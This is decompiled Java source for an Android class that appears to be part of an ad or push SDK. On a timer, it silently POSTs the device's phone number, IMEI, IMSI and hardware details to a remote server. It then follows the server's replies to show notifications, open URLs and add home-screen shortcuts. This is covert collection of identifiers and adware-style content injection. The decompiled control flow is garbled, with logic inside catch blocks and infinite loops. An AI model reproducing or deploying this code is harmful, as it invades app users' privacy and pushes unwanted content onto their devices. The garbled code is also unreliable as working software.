package ru.alpha;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.Intent.ShortcutIconResource;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Vector;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

public class Alpha
{
  public static Settings settings;
  
  public Alpha(Context paramContext, String paramString1, String paramString2)
  {
    System.out.println("Alpha START");
    settings = new Settings();
    Settings localSettings = settings;
    Settings.setSettings(settings);
    if (!settings.load(paramContext))
    {
      if ((paramString1 != null) && (paramString2 != null)) {}
      try
      {
        settings.timeNextConnection = (System.currentTimeMillis() + Constants.MINUTE);
        settings.apiKey = paramString1;
        settings.appId = paramString2;
        settings.save(paramContext);
        startTimer(paramContext);
        return;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return;
      }
    }
    if (System.currentTimeMillis() > settings.timeNextConnection)
    {
      settings.timeNextConnection = (System.currentTimeMillis() + Constants.MINUTE);
      settings.save(paramContext);
    }
    startTimer(paramContext);
  }
  
  public static void createNewShortcut(Context paramContext, String paramString1, int paramInt, String paramString2)
  {
    try
    {
      Object localObject = Settings.getSettings();
      if (((Settings)localObject).idList.contains(Integer.valueOf(paramInt))) {
        return;
      }
      ((Settings)localObject).idList.add(Integer.valueOf(paramInt));
      ((Settings)localObject).save(paramContext);
      paramString2 = new Intent("android.intent.action.VIEW", Uri.parse(paramString2));
      paramString2.addFlags(268435456);
      paramString2.addFlags(67108864);
      localObject = new Intent();
      ((Intent)localObject).putExtra("android.intent.extra.shortcut.INTENT", paramString2);
      ((Intent)localObject).putExtra("android.intent.extra.shortcut.NAME", paramString1);
      ((Intent)localObject).putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(paramContext, paramInt));
      ((Intent)localObject).setAction("com.android.launcher.action.INSTALL_SHORTCUT");
      paramContext.sendBroadcast((Intent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void createShortcut(Context paramContext) {}
  
  public static void createShortcut(Context paramContext, String paramString1, int paramInt, String paramString2)
  {
    paramString2 = new Intent("android.intent.action.VIEW", Uri.parse(paramString2));
    paramString2.addFlags(268435456);
    paramString2.addFlags(67108864);
    Intent localIntent = new Intent();
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", paramString2);
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString1);
    localIntent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(paramContext, paramInt));
    localIntent.putExtra("duplicate", false);
    localIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
    paramContext.sendBroadcast(localIntent);
  }
  
  public static String getAttributeValue(XmlPullParser paramXmlPullParser, String paramString)
  {
    int i = 0;
    while (i < paramXmlPullParser.getAttributeCount())
    {
      if (paramXmlPullParser.getAttributeName(i).equals(paramString)) {
        return paramXmlPullParser.getAttributeValue(i);
      }
      i += 1;
    }
    return "";
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private static ServerResponse parseResponse(InputStream paramInputStream)
  {
    ServerResponse localServerResponse = new ServerResponse();
    int i = 0;
    String str = "";
    for (;;)
    {
      XmlPullParser localXmlPullParser;
      try
      {
        localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
        localXmlPullParser.setInput(paramInputStream, null);
        paramInputStream = str;
        switch (localXmlPullParser.next())
        {
        case 2: 
          str = localXmlPullParser.getName();
          if (str.equals("notification"))
          {
            localServerResponse.notificationUrl = getAttributeValue(localXmlPullParser, "url");
            localServerResponse.notificationTickerText = getAttributeValue(localXmlPullParser, "tickerText");
            i = 1;
            paramInputStream = str;
            continue;
          }
          if (str.equals("openUrl"))
          {
            localServerResponse.openUrl = getAttributeValue(localXmlPullParser, "url");
            paramInputStream = str;
            continue;
          }
          paramInputStream = str;
        }
      }
      catch (Exception paramInputStream)
      {
        paramInputStream.printStackTrace();
        return localServerResponse;
      }
      if (str.equals("shortcut"))
      {
        localServerResponse.shortcutUrl = getAttributeValue(localXmlPullParser, "url");
        i = 2;
        paramInputStream = str;
        continue;
        if (!localXmlPullParser.getName().equals("response"))
        {
          if (localXmlPullParser.getName().equals("notification"))
          {
            i = 0;
            continue;
          }
          if (!localXmlPullParser.getName().equals("shortcut")) {
            continue;
          }
          i = 0;
          continue;
          if (paramInputStream.equals("wait")) {
            localServerResponse.wait = Long.parseLong(localXmlPullParser.getText());
          } else if (paramInputStream.equals("title"))
          {
            if (i == 1) {
              localServerResponse.notificationTitle = localXmlPullParser.getText();
            } else if (i == 2) {
              localServerResponse.shortcutTitle = localXmlPullParser.getText();
            }
          }
          else if (paramInputStream.equals("text"))
          {
            if (i == 1) {
              localServerResponse.notificationText = localXmlPullParser.getText();
            }
          }
          else if (paramInputStream.equals("icon"))
          {
            if (i == 1) {
              localServerResponse.notificationIcon = Integer.valueOf(localXmlPullParser.getText()).intValue();
            } else if (i == 2) {
              localServerResponse.shortcutIcon = Integer.valueOf(localXmlPullParser.getText()).intValue();
            }
          }
          else if (paramInputStream.equals("showHtml")) {
            localServerResponse.showHtml = localXmlPullParser.getText();
          }
        }
        else
        {
          return localServerResponse;
        }
        paramInputStream = "";
      }
    }
  }
  
  public static ServerResponse sendRequest()
  {
    System.out.println("Alpha sendRequest START");
    Object localObject3 = Settings.getSettings();
    Object localObject2 = new ServerResponse();
    try
    {
      HttpURLConnection localHttpURLConnection = (HttpURLConnection)new URL(Constants.SERVER).openConnection();
      localHttpURLConnection.setDoInput(true);
      localHttpURLConnection.setDoOutput(true);
      localHttpURLConnection.setUseCaches(false);
      localHttpURLConnection.setRequestMethod("POST");
      localHttpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
      DataOutputStream localDataOutputStream = new DataOutputStream(localHttpURLConnection.getOutputStream());
      localObject1 = localObject2;
      ((Exception)localObject2).printStackTrace();
    }
    catch (Exception localException2)
    {
      try
      {
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"apiKey\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(((Settings)localObject3).apiKey);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"appId\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(((Settings)localObject3).appId);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"phone\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(((Settings)localObject3).phone);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"imei\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(((Settings)localObject3).imei);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"imsi\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(((Settings)localObject3).imsi);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"time\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(String.valueOf(System.currentTimeMillis()));
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"model\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(Build.MODEL);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"manufacturer\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(Build.MANUFACTURER);
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("Content-Disposition: form-data; name=\"sdk\"");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes(String.valueOf(Build.VERSION.SDK_INT));
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("--AaB03x--");
        localObject1 = localObject2;
        localDataOutputStream.writeBytes("\r\n");
        localObject1 = localObject2;
        localDataOutputStream.flush();
        localObject1 = localObject2;
        localDataOutputStream.close();
        localObject1 = localObject2;
        System.out.println("getResponseCode: " + localHttpURLConnection.getResponseCode());
        localObject3 = localObject2;
        localObject1 = localObject2;
        if (localHttpURLConnection.getResponseCode() == 200)
        {
          localObject1 = localObject2;
          localObject3 = parseResponse(localHttpURLConnection.getInputStream());
        }
        localObject1 = localObject3;
        localHttpURLConnection.disconnect();
        return localObject3;
      }
      catch (Exception localException1)
      {
        Object localObject1;
        for (;;) {}
      }
      localException2 = localException2;
      localObject1 = localObject2;
      localObject2 = localException2;
    }
    return localObject1;
  }
  
  public static void showNotification(Context paramContext, String paramString1, String paramString2, String paramString3, int paramInt, String paramString4, Class paramClass)
  {
    try
    {
      NotificationManager localNotificationManager = (NotificationManager)paramContext.getSystemService("notification");
      paramString1 = new Notification(paramInt, paramString1, System.currentTimeMillis());
      paramClass = new Intent(paramContext, paramClass);
      paramClass.putExtra("url", paramString4);
      paramString1.setLatestEventInfo(paramContext, paramString2, paramString3, PendingIntent.getActivity(paramContext, 0, paramClass, 0));
      localNotificationManager.notify(1, paramString1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startTimer(Context paramContext)
  {
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.alarm");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, Settings.getSettings().timeNextConnection, (PendingIntent)localObject);
      System.out.println("Alpha Timer START");
      return;
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
      }
    }
  }
}
